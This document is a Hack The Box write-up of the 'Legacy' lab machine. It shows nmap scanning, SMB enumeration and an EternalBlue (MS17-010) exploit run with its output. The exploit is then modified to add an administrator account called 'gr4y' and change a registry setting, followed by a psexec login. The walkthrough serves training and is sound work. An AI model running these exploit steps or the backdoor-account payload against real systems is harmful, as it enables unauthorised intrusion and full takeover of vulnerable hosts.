@@ -1,0 +1,334 @@
+---
+tags:
+  - ms17-010
+  - smb
+  - eternalblue
+---
+# HTB: Legacy
+
+***Overview**: Legacy is an easy rated machine on hackthebox, that simply exploits the MS17-010 vulnerability on a server running Microsoft Windows XP SP2 or SP3.*
+
+## Scanning and Enumeration
+
+- So we start by scanning for open ports. Using masscan we scan all 65535 TCP ports and we discover 3 open ports
+
+```shell
+┌──(kali㉿kali)-[~/HTB/Legacy]
+└─$ sudo masscan -p1-65535 10.10.10.4 --rate=1000 -e tun0 > ports
+[sudo] password for kali: 
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-11-11 11:38:36 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~/HTB/Legacy]
+└─$ cat ports    
+Discovered open port 135/tcp on 10.10.10.4                                     
+Discovered open port 139/tcp on 10.10.10.4                                     
+Discovered open port 445/tcp on 10.10.10.4                                     
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~/HTB/Legacy]
+└─$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
+
+```
+
+- then we enumerate for the services on the open ports
+
+```shell
+┌──(kali㉿kali)-[~/HTB/Legacy]
+└─$ nmap -Pn -sV -sC -p$ports -oA nmap/legacy_full 10.10.10.4 -v
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 06:44 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 06:44
+Completed NSE at 06:44, 0.00s elapsed
+Initiating NSE at 06:44
+Completed NSE at 06:44, 0.00s elapsed
+Initiating NSE at 06:44
+Completed NSE at 06:44, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 06:44
+Completed Parallel DNS resolution of 1 host. at 06:44, 0.05s elapsed
+Initiating Connect Scan at 06:44
+Scanning 10.10.10.4 [3 ports]
+Discovered open port 139/tcp on 10.10.10.4
+Discovered open port 445/tcp on 10.10.10.4
+Discovered open port 135/tcp on 10.10.10.4
+Completed Connect Scan at 06:44, 0.17s elapsed (3 total ports)
+Initiating Service scan at 06:44
+Scanning 3 services on 10.10.10.4
+Completed Service scan at 06:44, 6.73s elapsed (3 services on 1 host)
+NSE: Script scanning 10.10.10.4.
+Initiating NSE at 06:44
+Completed NSE at 06:44, 10.91s elapsed
+Initiating NSE at 06:44
+Completed NSE at 06:44, 0.01s elapsed
+Initiating NSE at 06:44
+Completed NSE at 06:44, 0.02s elapsed
+Nmap scan report for 10.10.10.4
+Host is up (0.16s latency).
+
+PORT    STATE SERVICE     VERSION
+135/tcp open  msrpc       Microsoft Windows RPC
+139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
+445/tcp open  ���*V      Windows XP microsoft-ds
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:87:b1 (VMware)
+| Names:
+|   LEGACY<00>           Flags: <unique><active>
+|   HTB<00>              Flags: <group><active>
+|   LEGACY<20>           Flags: <unique><active>
+|   HTB<1e>              Flags: <group><active>
+|   HTB<1d>              Flags: <unique><active>
+|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+|_  System time: 2023-11-16T15:42:13+02:00
+|_clock-skew: mean: 5d00h57m38s, deviation: 1h24m50s, median: 4d23h57m38s
+```
+
+- we then conduct a vulnerability scan using Nmap, and we can see that it is vulnerable to ms17-010
+
+```shell
+┌──(kali㉿kali)-[~/HTB/Legacy]
+└─$ nmap --script=vuln 10.10.10.4 -p139,445                                                       
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 07:06 EST
+Nmap scan report for 10.10.10.4
+Host is up (0.15s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+|_smb-vuln-ms10-054: false
+
+Nmap done: 1 IP address (1 host up) scanned in 18.91 seconds
+```
+
+- we can enumerate more on SMB and the access to shares
+
+```shell
+──(kali㉿kali)-[~/HTB/Legacy]
+└─$ nmap --script "safe or smb-enum-*" -p 445 10.10.10.4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 07:07 EST
+Pre-scan script results:
+| targets-asn: 
+|_  targets-asn.asn is a mandatory parameter
+|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
+|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
+| broadcast-dropbox-listener: 
+| displayname  ip            port   version  host_int             namespaces
+|_             192.168.14.1  17500  2.0      1.7596736485754e+38  2589442961
+Nmap scan report for 10.10.10.4
+Host is up (0.15s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+|_  System time: 2023-11-16T16:05:57+02:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-mbenum: 
+|_  ERROR: Call to Browser Service failed with status = 2184
+| smb-enum-shares: 
+|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
+|   account_used: <blank>
+|   \\10.10.10.4\ADMIN$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: <none>
+|   \\10.10.10.4\C$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: <none>
+|   \\10.10.10.4\IPC$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|_    Anonymous access: READ
+|_smb2-time: Protocol negotiation failed (SMB2)
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+| unusual-port: 
+|_  WARNING: this script depends on Nmap's service/version detection (-sV)
+| port-states: 
+|   tcp: 
+|_    open: 445
+|_fcrdns: FAIL (No PTR record)
+| dns-blacklist: 
+|   SPAM
+|     l2.apews.org - FAIL
+|_    dnsbl.inps.de - FAIL
+| smb-protocols: 
+|   dialects: 
+|_    NT LM 0.12 (SMBv1) [dangerous, but default]
+|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:87:b1 (VMware)
+|_msrpc-enum: NT_STATUS_ACCESS_DENIED
+|_clock-skew: mean: 5d00h57m38s, deviation: 1h24m50s, median: 4d23h57m38s
+|_smb2-capabilities: SMB 2+ not supported
+
+Post-scan script results:
+| reverse-index: 
+|_  445/tcp: 10.10.10.4
+Nmap done: 1 IP address (1 host up) scanned in 160.37 seconds
+```
+
+- we can also run an OS scan to know what version of Windows is running
+
+```shell
+┌──(kali㉿kali)-[~/HTB/Legacy]
+└─$ sudo nmap -sV -p445 -O 10.10.10.4
+[sudo] password for kali: 
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 08:01 EST
+Nmap scan report for 10.10.10.4
+Host is up (0.16s latency).
+
+PORT    STATE SERVICE      VERSION
+445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows XP SP2 or SP3 (96%), Microsoft Windows XP SP3 (96%), Microsoft Windows Server 2003 SP1 or SP2 (94%), Microsoft Windows Server 2003 SP2 (94%), Microsoft Windows Server 2003 SP1 (94%), Microsoft Windows 2003 SP2 (94%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (93%), Microsoft Windows 2000 (93%), Microsoft Windows 2000 SP4 (93%), Microsoft Windows XP Professional SP2 or Windows Server 2003 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows XP; CPE: cpe:/o:microsoft:windows_xp
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds
+
+```
+
+## Exploitation: MS17-010
+
+- We could utilize the Eternal blue exploitation using the AutoBlue exploit at [https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
+- But instead I utilized the exploit [https://github.com/worawit/MS17-010/](https://github.com/worawit/MS17-010/)
+- so first of we run the checker to see if it is vulnerable and it is 
+
+```shell
+┌──(kali㉿kali)-[/opt/MS17-010]
+└─$ python2 checker.py 10.10.10.4               
+Target OS: Windows 5.1
+The target is not patched
+
+=== Testing named pipes ===
+spoolss: Ok (32 bit)
+samr: STATUS_ACCESS_DENIED
+netlogon: STATUS_ACCESS_DENIED
+lsarpc: STATUS_ACCESS_DENIED
+browser: STATUS_OBJECT_NAME_NOT_FOUND
+```
+
+- Since the version is of Windows detected in our OS scan is Microsoft Windows XP SP2 or SP3, we utilize the zzz_exploit.py script and this is because it has been tested on that OS. So when we run it, we see that the only thing it does is to create a file pwned.txt in the root `C:\` directory
+
+```shell
+┌──(kali㉿kali)-[/opt/MS17-010]
+└─$ python2 zzz_exploit.py 10.10.10.4 spoolss               
+Target OS: Windows 5.1
+Groom packets
+attempt controlling next transaction on x86
+success controlling one transaction
+modify parameter count to 0xffffffff to be able to write backward
+leak next transaction
+CONNECTION: 0x85d54bf8
+SESSION: 0xe1088658
+FLINK: 0x7bd48
+InData: 0x7ae28
+MID: 0xa
+TRANS1: 0x78b50
+TRANS2: 0x7ac90
+modify transaction struct for arbitrary read/write
+make this SMB session to be SYSTEM
+current TOKEN addr: 0xe177f188
+userAndGroupCount: 0x3
+userAndGroupsAddr: 0xe177f228
+overwriting token UserAndGroups
+creating file c:\pwned.txt on the target
+Done
+```
+
+- By examining the exploit script, we can see that's what it says in the script, what it does is just create the file pwned.txt at line 975
+
+![](assets/Legacy_assets/Pasted%20image%2020231111142851.png)
+
+- so coming across the blog post at [https://nullsec.us/eternalblue-on-windows-xp/](https://nullsec.us/eternalblue-on-windows-xp/), we can see that we can edit the script by telling it to add a new user and adding the user to the Administrators group
+
+```python
+service_exec(conn, r'cmd /c net user gr4y Password /add')
+service_exec(conn, r'cmd /c net localgroup Administrators gr4y /add')
+service_exec(conn, r'reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v forceguest /t reg_dword /d 0 /f')
+```
+
+- so lets add the above lines to the script
+
+![](assets/Legacy_assets/Pasted%20image%2020231111143004.png)
+
+- after doing that, we can then utilize psexec to access the machine using the new account created
+
+```shell
+impacket-psexec gr4y:Password@10.10.10.4
+```
+
+![](assets/Legacy_assets/Pasted%20image%2020231111145156.png)
+
+- we can view the root file and also view the user file
+
+![](assets/Legacy_assets/Pasted%20image%2020231111150039.png)
+
+![](assets/Legacy_assets/Pasted%20image%2020231111150153.png)
